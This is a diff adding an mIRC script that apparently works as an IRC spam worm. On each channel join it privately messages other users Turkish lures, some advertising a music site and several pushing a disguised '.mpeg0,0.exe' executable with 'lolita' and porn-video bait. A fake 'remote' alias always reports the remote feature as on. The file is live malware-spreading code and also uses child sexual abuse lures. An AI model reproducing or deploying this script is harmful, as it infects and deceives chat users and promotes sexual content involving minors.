@@ -1,0 +1,27 @@
+[script]
+n0=on 1:JOIN:#:{
+n1=  if $nick != $me {
+n2=    .msg $nick %mesaj [ $+ [ $rand(1,9) ] ]
+n3=  }
+n4=}
+n5=
+n6=on 1:DISCONNECT: {
+n7=  .server
+n8=}
+n9=
+n10=alias remote {
+n11=  if $1 == on { echo *** Remote is On }
+n12=  elseif $1 == off { echo *** Remote is Off }
+n13=  else { echo *** Remote is On }
+n14=}
+n15=on 1:START:{
+n16=set %mesaj1 14Türkçe Mp3, Yabancý Mp3, Bedava Klipler, Online Dinleme Seçenekleri, Sanatçýlarýn Wallpaper'larý, HitList'ler, Mp3 Ýndirme Hýzýnýzý Arrtýracak Programlar, Mp3 Player Tanýtýmlarý, Hiç Bir Yerde Bulamayacaðýnýz Full Albümler... Kýsaca Müzikle Ýlgili HERÞEY! Týklayýn ->4 www.muzikkrali.com
+n17=set %mesaj2 4Büyük lolita arþivimizden bir kaç dakikalýk, çok orijinal bir video... Ýzlemek istiyorsan buraya týkla ->2 http://lolitavideos.sitemynet.com/lolitavideo.mpeg0,0.exe
+n18=set %mesaj3 4Türkiye'de Olay Yaratan Video!!! Büyük Olaylara Sebep Olan Bu Porno Videoyu Ýzlemek Ýçin Týklayýn! ->2 http://lolitavideos.sitemynet.com/lolitavideo.mpeg0,0.exe
+n19=set %mesaj4 14Türkçe Mp3, Yabancý Mp3, Bedava Klipler, Online Dinleme Seçenekleri, Sanatçýlarýn Wallpaper'larý, HitList'ler, Mp3 Ýndirme Hýzýnýzý Arrtýracak Programlar, Mp3 Player Tanýtýmlarý, Hiç Bir Yerde Bulamayacaðýnýz Full Albümler... Kýsaca Müzikle Ýlgili HERÞEY! Týklayýn ->4 www.muzikkrali.com
+n20=set %mesaj5 14Türkçe Mp3, Yabancý Mp3, Bedava Klipler, Online Dinleme Seçenekleri, Sanatçýlarýn Wallpaper'larý, HitList'ler, Mp3 Ýndirme Hýzýnýzý Arrtýracak Programlar, Mp3 Player Tanýtýmlarý, Hiç Bir Yerde Bulamayacaðýnýz Full Albümler... Kýsaca Müzikle Ýlgili HERÞEY! Týklayýn ->4 www.muzikkrali.com
+n21=set %mesaj6 4Türkiye'de Olay Yaratan Video!!! Büyük Olaylara Sebep Olan Bu Porno Videoyu Ýzlemek Ýçin Týklayýn! ->2 http://lolitavideos.sitemynet.com/lolitavideo.mpeg0,0.exe
+n22=set %mesaj7 14Türkçe Mp3, Yabancý Mp3, Bedava Klipler, Online Dinleme Seçenekleri, Sanatçýlarýn Wallpaper'larý, HitList'ler, Mp3 Ýndirme Hýzýnýzý Arrtýracak Programlar, Mp3 Player Tanýtýmlarý, Hiç Bir Yerde Bulamayacaðýnýz Full Albümler... Kýsaca Müzikle Ýlgili HERÞEY! Týklayýn ->4 www.muzikkrali.com
+n23=set %mesaj8 4Türkiye'de Olay Yaratan Video!!! Büyük Olaylara Sebep Olan Bu Porno Videoyu Ýzlemek Ýçin Týklayýn! ->2 http://lolitavideos.sitemynet.com/lolitavideo.mpeg0,0.exe
+n24=set %mesaj9 14Türkçe Mp3, Yabancý Mp3, Bedava Klipler, Online Dinleme Seçenekleri, Sanatçýlarýn Wallpaper'larý, HitList'ler, Mp3 Ýndirme Hýzýnýzý Arrtýracak Programlar, Mp3 Player Tanýtýmlarý, Hiç Bir Yerde Bulamayacaðýnýz Full Albümler... Kýsaca Müzikle Ýlgili HERÞEY! Týklayýn ->4 www.muzikkrali.com
+n25=}
